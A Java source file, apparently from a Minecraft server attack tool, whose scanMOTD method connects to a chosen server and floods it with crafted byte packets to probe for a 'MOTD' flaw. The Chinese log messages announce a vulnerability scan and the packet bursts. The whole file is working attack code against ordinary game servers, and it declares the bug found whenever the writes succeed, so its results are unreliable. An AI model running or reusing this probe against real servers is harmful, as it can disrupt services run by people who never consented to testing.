package me.alikomi.endminecraft.Tasks;

import me.alikomi.endminecraft.Main;
import me.alikomi.endminecraft.utils.Util;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ScanBug extends Util {

    public static void scanMOTD(String ip, int port) {
        boolean con = false;
        log("正在进行MOTD漏洞扫描，请等待");
        try {
            final Socket socket = new Socket();
            log("正在连接...");
            socket.connect(new InetSocketAddress(ip, port));
            if (socket.isConnected()) log("连接成功");
            con = true;
            final byte[] head = new byte[]{0x07, 0x00, 0x04, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01};
            if (socket.isConnected() && !socket.isClosed()) {
                final OutputStream out = socket.getOutputStream();
                out.write(head);
                out.flush();
                for (int iq = 0; iq < 10; iq++) {
                    Thread.sleep(250);
                    log("第 " + iq + "次发包,共10次");
                    for (int i = 0; i < 10; i++) {
                        out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                    }
                    out.flush();
                    for (int i = 0; i < 10; i++) {
                        out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                    }
                    out.flush();
                }
            }
            socket.close();
            log("发包成功，发现motd漏洞");
            Main.bugData.setMotdBug(true);
        } catch (final Exception ignored) {
            if (con) {
                log("无MOTD漏洞");
            } else {
                log("服务器连接失败");
            }
        }
    }

}
